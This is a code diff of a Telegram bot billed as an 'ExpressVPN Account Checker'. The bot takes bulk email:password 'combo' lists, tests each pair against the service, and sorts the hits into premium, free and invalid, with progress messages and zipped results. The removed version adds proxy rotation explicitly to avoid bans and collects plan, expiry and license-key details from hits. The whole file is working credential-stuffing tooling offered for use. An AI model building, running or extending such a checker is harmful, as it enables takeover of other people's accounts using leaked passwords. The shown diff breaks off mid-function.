-            f"📅 Plan: {plan}",
-            f"⏳ Expired: {expire}",
-        ]
-        if ovpn:
-            lines.append(f"🖧 OVPN: <code>{ovpn}</code>")
-        return "\n".join(lines)
+    welcome = (
+        "<b>ExpressVPN Account Checker</b>\n\n"
+        "Send a .txt file with accounts in format:\n"
+        "<code>email:password</code>\n\n"
+        "Or paste combos directly.\n\n"
+        "<b>Commands</b>\n"
+        "/start - Show menu\n"
+        "/check - Start checking\n"
+        "/status - View progress\n"
+        "/stop - Stop current job\n"
+        "/results - Download results\n"
+        "/clear - Clear loaded accounts\n\n"
+        "<i>Author: @X1n0q</i>"
+    )
+    bot.reply_to(message, welcome, reply_markup=main_menu())
 
-    elif status == "BAD":
-        return f"❌ <b>BAD</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>"
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    if not is_allowed(call.from_user.id):
+        bot.answer_callback_query(call.id, "Access denied.")
+        return
+    
+    if call.data == "start_check":
+        bot.answer_callback_query(call.id)
+        session = get_session(call.message.chat.id)
+        if session["running"]:
+            bot.edit_message_text("Already running. Use /stop first.", call.message.chat.id, call.message.message_id)
+            return
+        if not session["accounts"]:
+            bot.edit_message_text("No accounts loaded. Send a .txt file first.", call.message.chat.id, call.message.message_id)
+            return
+        cmd_check(call.message)
+    
+    elif call.data == "status":
+        bot.answer_callback_query(call.id)
+        cmd_status(call.message)
+    
+    elif call.data == "results":
+        bot.answer_callback_query(call.id)
+        cmd_results(call.message)
+    
+    elif call.data == "help":
+        bot.answer_callback_query(call.id)
+        cmd_start(call.message)
 
-    elif status == "BAN":
-        return f"🚫 <b>BANNED</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>\n<i>IP or account temporarily blocked</i>"
+@bot.message_handler(commands=["clear"])
+def cmd_clear(message):
+    if not is_allowed(message.from_user.id):
+        return
+    session = get_session(message.chat.id)
+    if session["running"]:
+        bot.reply_to(message, "Stop the current job first with /stop")
+        return
+    session["accounts"] = []
+    session["premium_hits"] = []
+    session["free_hits"] = []
+    session["invalid_hits"] = []
+    session["stats"] = {"checked": 0, "total": 0, "premium": 0, "free": 0, "invalid": 0}
+    bot.reply_to(message, "Session cleared.")
 
-    else:
-        error = result.get("error", "Unknown error")
-        return f"⚠️ <b>ERROR</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>\n📝 {error}"
+@bot.message_handler(commands=["stop"])
+def cmd_stop(message):
+    if not is_allowed(message.from_user.id):
+        return
+    session = get_session(message.chat.id)
+    if not session["running"]:
+        bot.reply_to(message, "Nothing is running.")
+        return
+    session["stop"] = True
+    bot.reply_to(message, "Stopping...")
 
-def create_main_menu(user_id: int) -> InlineKeyboardMarkup:
-    keyboard = [
-        [
-            InlineKeyboardButton("🚀 Start Check", callback_data="start_check"),
-            InlineKeyboardButton("📊 Stats", callback_data="stats")
-        ],
-        [
-            InlineKeyboardButton("📁 Manage Proxies", callback_data="manage_proxies"),
-            InlineKeyboardButton("📖 Help", callback_data="help")
-        ],
-    ]
-    if is_admin(user_id):
-        keyboard.append([
-            InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")
-        ])
-    return InlineKeyboardMarkup(keyboard)
+@bot.message_handler(commands=["status"])
+def cmd_status(message):
+    if not is_allowed(message.from_user.id):
+        return
+    session = get_session(message.chat.id)
+    s = session["stats"]
+    total = s["total"] or 1
+    pct = (s["checked"] / total) * 100 if total else 0
+    bar_len = 20
+    filled = int(bar_len * pct / 100)
+    bar = "█" * filled + "░" * (bar_len - filled)
+    text = (
+        f"<b>Progress</b>\n"
+        f"<code>{bar}</code> {pct:.1f}%\n\n"
+        f"Premium : {s['premium']}\n"
+        f"Free    : {s['free']}\n"
+        f"Invalid : {s['invalid']}\n"
+        f"Checked : {s['checked']}/{s['total']}\n"
+        f"Running : {'Yes' if session['running'] else 'No'}"
+    )
+    bot.reply_to(message, text)
 
-def create_proxy_menu() -> InlineKeyboardMarkup:
-    keyboard = [
-        [
-            InlineKeyboardButton("📥 Import Proxies", callback_data="import_proxies"),
-            InlineKeyboardButton("🧹 Clear Proxies", callback_data="clear_proxies")
-        ],
-        [
-            InlineKeyboardButton("📋 Show Proxies", callback_data="show_proxies"),
-            InlineKeyboardButton("🔙 Back", callback_data="main_menu")
-        ]
-    ]
-    return InlineKeyboardMarkup(keyboard)
+@bot.message_handler(commands=["results"])
+def cmd_results(message):
+    if not is_allowed(message.from_user.id):
+        return
+    session = get_session(message.chat.id)
+    if session["running"]:
+        bot.reply_to(message, "Job still running. Use /stop first.")
+        return
 
-def create_admin_menu() -> InlineKeyboardMarkup:
-    keyboard = [
-        [
-            InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats"),
-            InlineKeyboardButton("👥 Users", callback_data="admin_users")
-        ],
-        [
-            InlineKeyboardButton("🔧 Toggle Maintenance", callback_data="toggle_maintenance"),
-            InlineKeyboardButton("📋 Error Log", callback_data="error_log")
-        ],
-        [
-            InlineKeyboardButton("🔄 Reset Stats", callback_data="reset_stats"),
-            InlineKeyboardButton("🔙 Back", callback_data="main_menu")
-        ]
-    ]
-    return InlineKeyboardMarkup(keyboard)
+    premium = session["premium_hits"]
+    free = session["free_hits"]
+    invalid = session["invalid_hits"]
 
-# ── Job Queue for Async Processing ──────────────────────────────────────
-class CheckJob:
-    def __init__(self, user_id: int, combos: List[str], proxies: List[str], message: Message):
-        self.user_id = user_id
-        self.combos = combos
-        self.proxies = proxies
-        self.message = message
-        self.results = []
-        self.progress = {"total": len(combos), "checked": 0, "hits": 0, "expired": 0, "bad": 0, "errors": 0}
-        self.is_running = True
-        self.start_time = datetime.now()
+    if not premium and not free and not invalid:
+        bot.reply_to(message, "No results yet. Load accounts and /check first.")
+        return
 
-async def process_job(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
-    user_state = bot_state.get_user(job.user_id)
-    user_state.is_processing = True
+    with tempfile.TemporaryDirectory() as tmp:
+        premium_path = os.path.join(tmp, "premium.txt")
+        free_path = os.path.join(tmp, "free.txt")
+        invalid_path = os.path.join(tmp, "invalid.txt")
 
-    proxy_pool = job.proxies if job.proxies else [None]
-    proxy_idx = 0
+        with open(premium_path, "w", encoding="utf-8") as f:
+            for hit in premium:
+                f.write(format_hit(hit, True) + "\n\n")
+        with open(free_path, "w", encoding="utf-8") as f:
+            for hit in free:
+                f.write(format_hit(hit, False) + "\n\n")
+        with open(invalid_path, "w", encoding="utf-8") as f:
+            for item in invalid:
+                f.write(f"{item}\n")
 
-    executor = concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS)
-    loop = asyncio.get_event_loop()
+        zip_path = os.path.join(tmp, "results.zip")
+        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
+            zf.write(premium_path, "premium.txt")
+            zf.write(free_path, "free.txt")
+            zf.write(invalid_path, "invalid.txt")
 
-    results = []
-    semaphore = asyncio.Semaphore(MAX_THREADS)
+        caption = f"Results\nPremium: {len(premium)}\nFree: {len(free)}\nInvalid: {len(invalid)}"
+        with open(zip_path, "rb") as f:
+            bot.send_document(message.chat.id, f, caption=caption)
 
-    async def check_one(combo: str, proxy: Optional[str]):
-        nonlocal proxy_idx
-        try:
+@bot.message_handler(content_types=["document"])
+def handle_document(message):
+    if not is_allowed(message.from_user.id):
+        return
+    session = get_session(message.chat.id)
+    if session["running"]:
+        bot.reply_to(message, "Job running. Use /stop first.")
+        return
+
+    doc = message.document
+    if not doc.file_name.lower().endswith(".txt"):
+        bot.reply_to(message, "Send a .txt file with email:password lines.")
+        return
+
+    try:
+        file_info = bot.get_file(doc.file_id)
+        downloaded = bot.download_file(file_info.file_path)
+        content = downloaded.decode("utf-8", errors="ignore")
+        lines = [ln.strip() for ln in content.splitlines() if ln.strip() and ":" in ln]
+        seen = set()
+        unique = []
+        for ln in lines:
+            if ln not in seen:
+                seen.add(ln)
+                unique.append(ln)
+        
+        session["accounts"] = unique
+        session["premium_hits"] = []
+        session["free_hits"] = []
+        session["invalid_hits"] = []
+        session["stats"] = {
+            "checked": 0,
+            "total": len(unique),
+            "premium": 0,
+            "free": 0,
+            "invalid": 0,
+        }
+        bot.reply_to(
+            message,
+            f"Loaded {len(unique)} accounts.\nUse /check to start.",
+            reply_markup=main_menu()
+        )
+    except Exception as e:
+        bot.reply_to(message, f"Failed to read file: {e}")
+
+@bot.message_handler(commands=["check"])
+def cmd_check(message):
+    if not is_allowed(message.from_user.id):
+        return
+    session = get_session(message.chat.id)
+    if session["running"]:
+        bot.reply_to(message, "Already running. Use /status or /stop")
+        return
+    if not session["accounts"]:
+        bot.reply_to(message, "No accounts loaded. Send a .txt file first.")
+        return
+
+    session["running"] = True
+    session["stop"] = False
+    session["start_time"] = datetime.now()
+    session["premium_hits"] = []
+    session["free_hits"] = []
+    session["invalid_hits"] = []
+    session["stats"] = {
+        "checked": 0,
+        "total": len(session["accounts"]),
+        "premium": 0,
+        "free": 0,
+        "invalid": 0,
+    }
+
+    status_msg = bot.reply_to(
+        message,
+        f"<b>Checking...</b>\nTotal: {len(session['accounts'])}",
+    )
+    session["status_msg_id"] = status_msg.message_id
+
+    def worker():
+        accounts = list(session["accounts"])
+        stats_lock = Lock()
+        last_update = 0
+
+        def update_status(force=False):
+            nonlocal last_update
+            now = time.time()
+            if not force and (now - last_update) < 5:
+                return
+            last_update = now
+            s = session["stats"]
+            total = s["total"] or 1
+            pct = (s["checked"] / total) * 100
+            bar_len = 20
+            filled = int(bar_len * pct / 100)
+            bar = "█" * filled + "░" * (bar_len - filled)
+            text = (
+                f"<b>Progress</b>\n"
+                f"<code>{bar}</code> {pct:.1f}%\n\n"
+                f"Premium : {s['premium']}\n"
+                f"Free    : {s['free']}\n"
+                f"Invalid : {s['invalid']}\n"
+                f"Checked : {s['checked']}/{s['total']}"
+            )
+            try:
+                bot.edit_message_text(text, message.chat.id, session["status_msg_id"])
+            except Exception:
+                pass
+
+        def process_one(combo):
+            if session["stop"] or shutdown_event.is_set():
+                return
+            if ":" not in combo:
+                with stats_lock:
+                    session["stats"]["checked"] += 1
+                    session["stats"]["invalid"] += 1
+                    session["invalid_hits"].append(combo)
+                return
+            
             email, password = combo.split(":", 1)
             email = email.strip()
             password = password.strip()
-        except ValueError:
-            job.progress["checked"] += 1
-            job.progress["bad"] += 1
-            return
+            status, data = check_account(email, password)
 
-        for attempt in range(MAX_RETRIES):
-            current_proxy = proxy_pool[proxy_idx % len(proxy_pool)] if proxy_pool else None
-            proxy_idx += 1
+            with stats_lock:
+                session["stats"]["checked"] += 1
+                if status == "premium":
+                    session["stats"]["premium"] += 1
+                    session["premium_hits"].append(data)
+                    try:
+                        report = format_hit(data, True)
+                        bot.send_message(message.chat.id, f"<b>Premium Hit</b>\n<pre>{report}</pre>")
+                    except Exception:
+                        pass
+                elif status == "free":
+                    session["stats"]["free"] += 1
+                    session["free_hits"].append(data)
+                    try:
+                        report = format_hit(data, False)
+                        bot.send_message(message.chat.id, f"<b>Valid Account</b>\n<pre>{report}</pre>")
+                    except Exception:
+                        pass
+                else:
+                    session["stats"]["invalid"] += 1
+                    reason = data if isinstance(data, str) else "unknown"
+                    session["invalid_hits"].append(f"{email}:{password} | {reason}")
+            
+            time.sleep(0.8)
+            update_status()
 
-            try:
-                async with semaphore:
-                    result = await loop.run_in_executor(
-                        executor,
-                        check_account,
-                        email,
-                        password,
-                        current_proxy
-                    )
-            except Exception as e:
-                if attempt == MAX_RETRIES - 1:
-                    job.progress["checked"] += 1
-                    job.progress["errors"] += 1
-                    return
-                await asyncio.sleep(1)
-                continue
+        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+            futures = [executor.submit(process_one, acc) for acc in accounts]
+            for fut in as_completed(futures):
+                if session["stop"] or shutdown_event.is_set():
+                    executor.shutdown(wait=False, cancel_futures=True)
+                    break
+                try:
+                    fut.result()
+                except Exception:
+                    pass
+                update_status()
 
-            status = result.get("status", "ERROR")
+        session["running"] = False
+        update_status(force=True)
 
-            if status == "BAN":
-                proxy_idx += 1
-                await asyncio.sleep(2)
-                continue
-
-            if status in ("ERROR",) and attempt < MAX_RETRIES - 1:
-                await asyncio.sleep(0.5)
-                continue
-
-            job.progress["checked"] += 1
-            if status == "HIT":
-                job.progress["hits"] += 1
-            elif status == "EXPIRED":
-                job.progress["expired"] += 1
-            elif status == "BAD":
-                job.progress["bad"] += 1
-            else:
-                job.progress["errors"] += 1
-
-            results.append(result)
-            break
-
-        if len(results) % 5 == 0:
-            await update_progress_message(job, context)
-
-    tasks = []
-    for combo in job.combos:
-        if not job.is_running:
-            break
-        proxy = proxy_pool[proxy_idx % len(proxy_pool)] if proxy_pool else None
-        proxy_idx += 1
-        tasks.append(check_one(combo, proxy))
-
-    await asyncio.gather(*tasks, return_exceptions=True)
-
-    job.is_running = False
-    user_state.is_processing = False
-    user_state.results = results
-    bot_state.total_checks += job.progress["checked"]
-    bot_state.total_hits += job.progress["hits"]
-
-    executor.shutdown(wait=False)
-    await send_final_results(job, context)
-
-async def update_progress_message(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        progress = job.progress
-        total = progress["total"]
-        checked = progress["checked"]
-        hits = progress["hits"]
-        expired = progress["expired"]
-        bad = progress["bad"]
-        errors = progress["errors"]
-
-        pct = (checked / total * 100) if total > 0 else 0
-        bar_len = 20
-        filled = int(pct / 100 * bar_len)
-        bar = "█" * filled + "░" * (bar_len - filled)
-
-        elapsed = (datetime.now() - job.start_time).total_seconds()
-        cpm = (checked / (elapsed / 60)) if elapsed > 0 else 0
-
-        text = f"""<b>📡 Checking ExpressVPN Accounts</b>
-
-Progress: [{bar}] {pct:.1f}%
-<b>{checked:,}</b> / {total:,} checked
-
-✅ <b>Hits:</b> {hits}
-⚠️ <b>Expired:</b> {expired}
-❌ <b>Bad:</b> {bad}
-🔴 <b>Errors:</b> {errors}
-
-⚡ Speed: {cpm:.1f} CPM
-⏱ Elapsed: {int(elapsed // 60)}m {int(elapsed % 60)}s
-
-<i>Results will be sent when complete...</i>
-"""
-        await job.message.edit_text(text, parse_mode=ParseMode.HTML)
-    except Exception as e:
-        logger.error(f"Failed to update progress: {e}")
-
-async def send_final_results(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
-    user_id = job.user_id
-    results = job.results
-    progress = job.progress
-
-    hits = [r for r in results if r.get("status") == "HIT"]
-    expired = [r for r in results if r.get("status") == "EXPIRED"]
-
-    summary = f"""<b>✅ Check Complete!</b>
-
-📊 <b>Results Summary</b>
-─────────────────
-✅ <b>Hits:</b> {len(hits)}
-⚠️ <b>Expired:</b> {len(expired)}
-❌ <b>Bad:</b> {progress['bad']}
-🔴 <b>Errors:</b> {progress['errors']}
-─────────────────
-<b>Total:</b> {progress['total']:,} checked
-
-⏱ Time: {(datetime.now() - job.start_time).total_seconds():.1f}s
-"""
-
-    await context.bot.send_message(
-        chat_id=user_id,
-        text=summary,
-        parse_mode=ParseMode.HTML
-    )
-
-    if hits:
-        hit_text = "<b>✅ HITS</b>\n" + "─" * 20 + "\n"
-        for hit in hits[:50]:
-            hit_text += format_result(hit) + "\n" + "─" * 20 + "\n"
-
-        if len(hits) > 50:
-            hit_text += f"\n<i>... and {len(hits) - 50} more hits</i>"
-
-        await context.bot.send_message(
-            chat_id=user_id,
-            text=hit_text,
-            parse_mode=ParseMode.HTML
+        s = session["stats"]
+        duration = (datetime.now() - session["start_time"]).total_seconds()
+        summary = (
+            f"<b>Check Complete</b>\n\n"
+            f"Premium : {s['premium']}\n"
+            f"Free    : {s['free']}\n"
+            f"Invalid : {s['invalid']}\n"
+            f"Checked : {s['checked']}/{s['total']}\n"
+            f"Time    : {int(duration // 60)}m {int(duration % 60)}s\n\n"
+            f"Use /results to download."
         )
-
-    if expired:
-        exp_text = "<b>⚠️ EXPIRED</b>\n" + "─" * 20 + "\n"
-        for exp in expired[:50]:
-            exp_text += format_result(exp) + "\n" + "─" * 20 + "\n"
-
-        if len(expired) > 50:
-            exp_text += f"\n<i>... and {len(expired) - 50} more expired</i>"
-
-        await context.bot.send_message(
-            chat_id=user_id,
-            text=exp_text,
-            parse_mode=ParseMode.HTML
-        )
-
-    if len(results) > 100:
         try:
-            file_path = f"/tmp/results_{user_id}_{int(time.time())}.txt"
-            with open(file_path, "w", encoding="utf-8") as f:
-                for r in results:
-                    status = r.get("status", "UNKNOWN")
-                    email = r.get("email", "")
-                    password = r.get("password", "")
-                    if status == "HIT":
-                        plan = r.get("plan", "")
-                        expire = r.get("expire", "")
-                        license_key = r.get("license", "")
-                        f.write(f"HIT|{email}|{password}|{plan}|{expire}|{license_key}\n")
-                    elif status == "EXPIRED":
-                        f.write(f"EXPIRED|{email}|{password}\n")
-                    elif status == "BAD":
-                        f.write(f"BAD|{email}|{password}\n")
-                    else:
-                        f.write(f"ERROR|{email}|{password}\n")
-
-            await context.bot.send_document(
-                chat_id=user_id,
-                document=open(file_path, "rb"),
-                filename=f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
-                caption="📁 Full results file"
-            )
-            os.unlink(file_path)
-        except Exception as e:
-            logger.error(f"Failed to send results file: {e}")
-
-    await context.bot.send_message(
-        chat_id=user_id,
-        text="🔙 <b>Return to main menu</b>",
-        reply_markup=create_main_menu(user_id),
-        parse_mode=ParseMode.HTML
-    )
-
-    user_state = bot_state.get_user(user_id)
-    user_state.is_processing = False
-    user_state.current_job = None
-
-# ── Command Handlers ──────────────────────────────────────────────────────
-
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    user_id = user.id
-
-    if not is_allowed(user_id):
-        await update.message.reply_text(
-            "🚫 <b>Access Denied</b>\n\nYou are not authorized to use this bot.",
-            parse_mode=ParseMode.HTML
-        )
-        return
-
-    if bot_state.is_maintenance:
-        await update.message.reply_text(
-            "🔧 <b>Maintenance Mode</b>\n\nThe bot is currently undergoing maintenance.",
-            parse_mode=ParseMode.HTML
-        )
-        return
-
-    welcome_text = f"""<b>🔐 ExpressVPN Account Checker</b>
-
-Welcome, {user.first_name}! 🎯
-
-I can check ExpressVPN accounts for validity. Send me a file with accounts in <code>email:password</code> format, or send the combos as text.
-
-<b>📋 Features</b>
-• Check accounts via ExpressVPN API
-• Proxy support (HTTP/HTTPS/SOCKS4/SOCKS5)
-• Real-time progress updates
-• Detailed results with subscription info
-
-<b>📖 Commands</b>
-/start - Show this menu
-/help - Get help
-/stats - View your statistics
-
-<b>💡 Quick Start</b>
-1. Send a .txt file with <code>email:password</code> combos
-2. Or paste combos directly
-3. Use inline buttons to manage proxies
-"""
-    await update.message.reply_text(
-        welcome_text,
-        reply_markup=create_main_menu(user_id),
-        parse_mode=ParseMode.HTML
-    )
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-
-    if not is_allowed(user_id):
-        await update.message.reply_text("Access denied.")
-        return
-
-    help_text = """<b>📖 Help & Commands</b>
-
-<b>📁 Accounts Format</b>
-Send a .txt file with one account per line:
-<code>email:password</code>
-
-<b>🌐 Proxy Support</b>
-Proxies can be in these formats:
-• <code>host:port</code>
-• <code>user:pass@host:port</code>
-• <code>http://host:port</code>
-• <code>socks5://host:port</code>
-
-<b>📊 Results</b>
-For each account, I show:
-• Status: HIT / EXPIRED / BAD / ERROR
-• Plan and expiration date
-• License key (if available)
-
-<b>⚡ Tips</b>
-• Use good proxies to avoid bans
-• Recommended: 10-50 accounts per file
-
-Use the buttons below to navigate! 👇
-"""
-
-    await update.message.reply_text(
-        help_text,
-        reply_markup=create_main_menu(user_id),
-        parse_mode=ParseMode.HTML
-    )
-
-async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-
-    if not is_allowed(user_id):
-        await update.message.reply_text("Access denied.")
-        return
-
-    user_state = bot_state.get_user(user_id)
-    stats = user_state.progress
-
-    text = f"""<b>📊 Your Statistics</b>
-
-Total checked: {stats.get('total', 0)}
-✅ Hits: {stats.get('hits', 0)}
-⚠️ Expired: {stats.get('expired', 0)}
-❌ Bad: {stats.get('bad', 0)}
-🔴 Errors: {stats.get('errors', 0)}
-
-Proxy count: {len(user_state.proxies)}
-Last activity: {user_state.last_command_time.strftime('%Y-%m-%d %H:%M')}
-"""
-
-    if is_admin(user_id):
-        text += f"""
-<b>📊 Global Stats</b>
-Total checks: {bot_state.total_checks:,}
-Total hits: {bot_state.total_hits:,}
-Active users: {len(bot_state.users)}
-Uptime: {datetime.now() - bot_state.start_time}
-Maintenance: {'🔧 ACTIVE' if bot_state.is_maintenance else '✅ Off'}
-"""
-
-    await update.message.reply_text(
-        text,
-        reply_markup=create_main_menu(user_id),
-        parse_mode=ParseMode.HTML
-    )
-
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-
-    user_id = query.from_user.id
-
-    if not is_allowed(user_id):
-        await query.edit_message_text("🚫 Access denied.")
-        return
-
-    if bot_state.is_maintenance and not is_admin(user_id):
-        await query.edit_message_text(
-            "🔧 The bot is currently in maintenance mode.",
-            reply_markup=create_main_menu(user_id)
-        )
-        return
-
-    data = query.data
-    user_state = bot_state.get_user(user_id)
-
-    if data == "main_menu":
-        await query.edit_message_text(
-            "🔙 <b>Main Menu</b>",
-            reply_markup=create_main_menu(user_id),
-            parse_mode=ParseMode.HTML
-        )
-
-    elif data == "start_check":
-        if user_state.is_processing:
-            await query.edit_message_text(
-                "⏳ <b>Already processing!</b>\n\nPlease wait for your current check to complete.",
-                reply_markup=create_main_menu(user_id),
-                parse_mode=ParseMode.HTML
-            )
-            return
-
-        await query.edit_message_text(
-            f"""<b>🚀 Start Checking</b>
-
-📤 <b>Send me a file or paste combos</b>
-
-<b>Format:</b> <code>email:password</code>
-<b>Proxies:</b> {len(user_state.proxies)} loaded
-
-<i>Send a .txt file or paste the combos directly.</i>
-
-🌐 <b>Proxy Status</b>
-{'✅ Proxies loaded' if user_state.proxies else '⚠️ No proxies loaded (direct connection)'}
-            """,
-            reply_markup=create_main_menu(user_id),
-            parse_mode=ParseMode.HTML
-        )
-        context.user_data['expecting_combos'] = True
-
-    elif data == "stats":
-        await stats_command(update, context)
-
-    elif data == "manage_proxies":
-        await query.edit_message_text(
-            f"""<b>🌐 Proxy Management</b>
-
-<b>Loaded:</b> {len(user_state.proxies)} proxies
-<b>Format:</b> HTTP, HTTPS, SOCKS4, SOCKS5
-
-<b>How to import:</b>
-• Send a .txt file with proxies
-• One proxy per line
-• Supports all common formats
-
-<b>Examples:</b>
-<code>192.168.1.1:8080
-user:pass@proxy.com:3128
-socks5://proxy.com:1080</code>
-            """,
-            reply_markup=create_proxy_menu(),
-            parse_mode=ParseMode.HTML
-        )
-
-    elif data == "import_proxies":
-        await query.edit_message_text(
-            "📥 <b>Import Proxies</b>\n\nSend me a <b>.txt</b> file with your proxies.",
-            reply_markup=create_proxy_menu(),
-            parse_mode=ParseMode.HTML
-        )
-        context.user_data['expecting_proxies'] = True
-
-    elif data == "clear_proxies":
-        count = len(user_state.proxies)
-        user_state.proxies = []
-        await query.edit_message_text(
-            f"🧹 <b>Proxies Cleared</b>\n\nRemoved {count} proxies.",
-            reply_markup=create_proxy_menu(),
-            parse_mode=ParseMode.HTML
-        )
-
-    elif data == "show_proxies":
-        if not user_state.proxies:
-            await query.edit_message_text(
-                "📋 <b>No proxies loaded</b>",
-                reply_markup=create_proxy_menu(),
-                parse_mode=ParseMode.HTML
-            )
-            return
-
-        proxy_text = "<b>📋 Loaded Proxies</b>\n\n"
-        for i, p in enumerate(user_state.proxies[:20], 1):
-            proxy_text += f"{i}. <code>{p}</code>\n"
-
-        if len(user_state.proxies) > 20:
-            proxy_text += f"\n<i>... and {len(user_state.proxies) - 20} more</i>"
-
-        proxy_text += f"\n\n<b>Total:</b> {len(user_state.proxies)} proxies"
-
-        await query.edit_message_text(
-            proxy_text,
-            reply_markup=create_proxy_menu(),
-            parse_mode=ParseMode.HTML
-        )
-
-    elif data == "help":
-        await help_command(update, context)
-
-    elif data == "admin_panel" and is_admin(user_id):
-        status = "🔧 ACTIVE" if bot_state.is_maintenance else "✅ Off"
-        text = f"""<b>⚙️ Admin Panel</b>
-
-<b>Bot Status</b>
-Maintenance: {status}
-Uptime: {datetime.now() - bot_state.start_time}
-Total checks: {bot_state.total_checks:,}
-Total hits: {bot_state.total_hits:,}
-Users: {len(bot_state.users)}
-Errors logged: {len(bot_state.error_log)}
-"""
-        await query.edit_message_text(
-            text,
-            reply_markup=create_admin_menu(),
-            parse_mode=ParseMode.HTML
-        )
-
-    elif data == "admin_stats" and is_admin(user_id):
-        text = f"""<b>📊 Detailed Stats</b>
-
-<b>Global</b>
-Total checks: {bot_state.total_checks:,}
-Total hits: {bot_state.total_hits:,}
-Active users: {len(bot_state.users)}
-
-<b>Uptime:</b> {datetime.now() - bot_state.start_time}
-"""
-        await query.edit_message_text(
-            text,
-            reply_markup=create_admin_menu(),
-            parse_mode=ParseMode.HTML
-        )
-
-    elif data == "admin_users" and is_admin(user_id):
-        user_list = sorted(bot_state.users.keys())
-        text = f"""<b>👥 Users ({len(user_list)})</b>
-
-"""
-        for i, uid in enumerate(user_list[:20], 1):
-            state = bot_state.get_user(uid)
-            prog = state.progress
-            text += f"{i}. ID: <code>{uid}</code> - {prog.get('total', 0)} checks\n"
-
-        if len(user_list) > 20:
-            text += f"\n<i>... and {len(user_list) - 20} more</i>"
-
-        await query.edit_message_text(
-            text,
-            reply_markup=create_admin_menu(),
-            parse_mode=ParseMode.HTML
-        )
-
-    elif data == "toggle_maintenance" and is_admin(user_id):
-        bot_state.is_maintenance = not bot_state.is_maintenance
-        status = "🔧 ACTIVE" if bot_state.is_maintenance else "✅ Off"
-        await query.edit_message_text(
-            f"<b>Maintenance Mode</b>\n\nStatus: {status}",
-            reply_markup=create_admin_menu(),
-            parse_mode=ParseMode.HTML
-        )
-
-    elif data == "error_log" and is_admin(user_id):
-        if not bot_state.error_log:
-            await query.edit_message_text(
-                "📋 <b>Error Log</b>\n\nNo errors logged.",
-                reply_markup=create_admin_menu(),
-                parse_mode=ParseMode.HTML
-            )
-            return
-
-        log_text = "<b>📋 Error Log (Last 20)</b>\n\n"
-        for entry in bot_state.error_log[-20:]:
-            log_text += f"• {entry}\n"
-
-        await query.edit_message_text(
-            log_text,
-            reply_markup=create_admin_menu(),
-            parse_mode=ParseMode.HTML
-        )
-
-    elif data == "reset_stats" and is_admin(user_id):
-        bot_state.total_checks = 0
-        bot_state.total_hits = 0
-        for state in bot_state.users.values():
-            state.progress = {"total": 0, "hits": 0, "expired": 0, "bad": 0, "errors": 0}
-        await query.edit_message_text(
-            "🔄 <b>Stats Reset</b>\n\nAll statistics have been reset.",
-            reply_markup=create_admin_menu(),
-            parse_mode=ParseMode.HTML
-        )
-
-    elif data == "cancel_check":
-        if user_state.is_processing and user_state.current_job:
-            user_state.current_job.is_running = False
-            user_state.is_processing = False
-            await query.edit_message_text(
-                "🛑 <b>Check Cancelled</b>",
-                reply_markup=create_main_menu(user_id),
-                parse_mode=ParseMode.HTML
-            )
-        else:
-            await query.edit_message_text(
-                "No active check to cancel.",
-                reply_markup=create_main_menu(user_id),
-                parse_mode=ParseMode.HTML
-            )
-
-    else:
-        await query.edit_message_text(
-            "Unknown command.",
-            reply_markup=create_main_menu(user_id)
-        )
-
-# ── File and Text Handlers ──────────────────────────────────────────────
-
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-
-    if not is_allowed(user_id):
-        await update.message.reply_text("🚫 Access denied.")
-        return
-
-    if bot_state.is_maintenance and not is_admin(user_id):
-        await update.message.reply_text("🔧 Bot is in maintenance mode.")
-        return
-
-    user_state = bot_state.get_user(user_id)
-    expecting_proxies = context.user_data.get('expecting_proxies', False)
-    expecting_combos = context.user_data.get('expecting_combos', False)
-
-    document = update.message.document
-    if not document:
-        await update.message.reply_text("Please send a valid file.")
-        return
-
-    try:
-        file = await context.bot.get_file(document.file_id)
-        content = await file.download_as_bytearray()
-        text = content.decode('utf-8', errors='ignore')
-    except Exception as e:
-        logger.error(f"Failed to download file: {e}")
-        await update.message.reply_text(f"⚠️ Failed to read file: {str(e)[:50]}")
-        return
-
-    if expecting_proxies:
-        proxies = parse_proxy_file(text)
-        if not proxies:
-            await update.message.reply_text(
-                "❌ No valid proxies found in the file.\nFormat: host:port or user:pass@host:port"
-            )
-            return
-
-        user_state.proxies.extend(proxies)
-        user_state.proxies = list(dict.fromkeys(user_state.proxies))
-
-        await update.message.reply_text(
-            f"✅ <b>Proxies Imported</b>\n\nImported: {len(proxies)} proxies\nTotal: {len(user_state.proxies)} proxies",
-            reply_markup=create_proxy_menu(),
-            parse_mode=ParseMode.HTML
-        )
-        context.user_data['expecting_proxies'] = False
-
-    elif expecting_combos or document.file_name.endswith('.txt'):
-        combos = [line.strip() for line in text.splitlines() if line.strip() and ':' in line]
-        if not combos:
-            await update.message.reply_text(
-                "❌ No valid combos found.\nFormat: email:password (one per line)"
-            )
-            return
-
-        if len(combos) > 500:
-            await update.message.reply_text(
-                f"⚠️ Too many accounts ({len(combos)}).\nPlease split into smaller files (max 500)."
-            )
-            return
-
-        if not rate_limiter.is_allowed(user_id):
-            await update.message.reply_text(
-                f"⏳ <b>Rate Limit Exceeded</b>\n\nMaximum {RATE_LIMIT_PER_MINUTE} checks per minute.",
-                parse_mode=ParseMode.HTML
-            )
-            return
-
-        if user_state.is_processing:
-            await update.message.reply_text(
-                "⏳ Already processing a check!",
-                reply_markup=create_main_menu(user_id)
-            )
-            return
-
-        await update.message.reply_text(
